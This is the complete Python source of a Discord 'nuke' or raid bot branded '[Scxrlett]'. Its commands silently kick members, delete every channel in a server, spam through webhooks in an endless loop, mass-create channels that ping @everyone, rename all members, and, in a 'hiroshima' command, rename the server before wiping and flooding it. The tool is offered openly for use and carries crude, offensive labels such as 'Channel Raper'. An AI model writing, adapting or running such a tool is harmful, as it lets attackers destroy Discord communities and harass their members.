from operator import truediv
import time
import sys
import os
import discord
from termcolor import colored
from discord.ext import commands

SKIP_BOTS = False
token=input("Please provide token: ")
MainMenu=("""
    ____________________________________________________________________
   |                                                                    |
   | ░██████╗░█████╗░██╗░░██╗██████╗░██╗░░░░░███████╗████████╗████████╗ |
   | ██╔════╝██╔══██╗╚██╗██╔╝██╔══██╗██║░░░░░██╔════╝╚══██╔══╝╚══██╔══╝ |
   | ╚█████╗░██║░░╚═╝░╚███╔╝░██████╔╝██║░░░░░█████╗░░░░░██║░░░░░░██║░░░ |
   | ░╚═══██╗██║░░██╗░██╔██╗░██╔══██╗██║░░░░░██╔══╝░░░░░██║░░░░░░██║░░░ |
   | ██████╔╝╚█████╔╝██╔╝╚██╗██║░░██║███████╗███████╗░░░██║░░░░░░██║░░░ |
   | ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚══════╝░░░╚═╝░░░░░░╚═╝░░░ |
   |____________________________________________________________________|
    Credits to Scxr~~               Their Worst Nightmare~ (⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄
                                                              _ is prefix
       [Commands]
       kick -silently kicks someone
       channelattack -deletes all channels
       webhookattack -uses webhooks to spam a message
       channelspam -adds channels named whatever the second param is 
       hiroshima -aio raid sure to screw the server""")


bot = commands.Bot(command_prefix='_', description='')


@bot.event
async def on_ready():
    print('Logged in as')
    print(bot.user.name)
    print(bot.user.id)
    print('------')
    print("Doomsday..")
    time.sleep(2)
    os.system("cls")
    print(colored(MainMenu, 'magenta'))

@bot.command()

async def webhookattack(ctx,message=None):
        await ctx.message.delete()
        ctx.send("https://cdn.discordapp.com/attachments/884505461104214026/884524015094480986/JQL4dim.png" + "[Scxrlett]", delete_after=1)
        if message == None:
                print("Please include the message to be spammed during attack...")
                return
        while True:
            webhook = await ctx.channel.create_webhook(name="[Scxrlett] Webhook Attack")
            await webhook.send(
                str(message), username="[Scxrlett]", avatar_url="https://cdn.discordapp.com/attachments/884505461104214026/884524015094480986/JQL4dim.png")

            webhooks = await ctx.channel.webhooks()
            for webhook in webhooks:
                await webhook.delete()
            os.system("cls")
@bot.command()
async def channelattack(ctx):
    embed = discord.Embed(
        title="[Scxrlett] Channel Raper,",
        description="Goodbye~~!"
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/884507818957340696/884536103841968148/e7qlh1D.gif")
    await ctx.send(embed=embed)
    await ctx.send("@everyone")
    time.sleep(4)
    for c in ctx.guild.channels: # iterating through each guild channel
        await c.delete()
        print(colored("channel deleted!",'red'))
    print("[Server Wiped~~!] returning in 5...")
    time.sleep(5)
    os.system("cls")
    print(colored(MainMenu, 'magenta'))
@bot.command()
async def kick(ctx, member: discord.Member):
    await ctx.message.delete()
    print(colored("Silently kicking:",'blue'))
    print(member)
    if member == None:
        
        return
    await member.kick()
    time.sleep(2)
    os.system("cls")
    print(colored(MainMenu, 'magenta'))
    return

@bot.command()
async def channelspam(ctx, name):
    num = 100
    await ctx.message.delete()
    os.system("cls")
    for x in range(num):
         guild = ctx.message.guild
         pentest1=await guild.create_text_channel(name)
         pentest2=await guild.create_text_channel(name)
         pentest3=await guild.create_text_channel(name)
         await pentest1.send("@everyone")
         await pentest2.send("@everyone")
         await pentest3.send("@everyone")
         print(colored("Attack Sent!", 'red'))
    print(colored("[Attack finished~~!] returning in 5...", 'magenta'))
    time.sleep(5)
    os.system("cls")
    print(colored(MainMenu,'magenta'))
         
@bot.command()
async def nickall(ctx, nick):
    for member in ctx.guild.members:
        if member == bot.user:
            continue 
        try:
            await member.edit(nick=nick)
        except:
            print('err')
         
@bot.command()
async def hiroshima(ctx):
    guild = ctx.message.guild
    with open('image.png', 'rb') as f:
        icon = f.read()
    await guild.edit(name='RAIDED BY [Scxrlett]', icon=icon)
    embed = discord.Embed(
        title="[Scxrlett] **HIROSHIMA**,",
        description="Goodbye~~! Enjoy the last few moments of this server\n(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄"
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/884507811449561109/884869198361296896/Anime-GIF-anime-gif-36988470-500-280.gif")
    await ctx.send(embed=embed)
    await ctx.send("@everyone")
    time.sleep(4)
    for c in ctx.guild.channels: # iterating through each guild channel
        await c.delete()
        print(colored("channel deleted!",'red'))
    print(colored("[Server Wiped~~!]", 'magenta'))
    time.sleep(1)
    num = 100
    for x in range(num):
         guild = ctx.message.guild
         pentest1=await guild.create_text_channel("[Scxrlett] HIROSHIMA")
         pentest2=await guild.create_text_channel("[Scxrlett] HIROSHIMA")
         pentest3=await guild.create_text_channel("[Scxrlett] HIROSHIMA")# iterating through each guild channe
         await pentest1.send("@everyone")
         await pentest2.send("@everyone")
         await pentest3.send("@everyone")
         print(colored("Attack Sent!", 'red'))
    print(colored("[Attack finished~~!]", 'magenta'))
    time.sleep(5)
    os.system("cls")
    print(colored(MainMenu, 'magenta'))










bot.run(token)

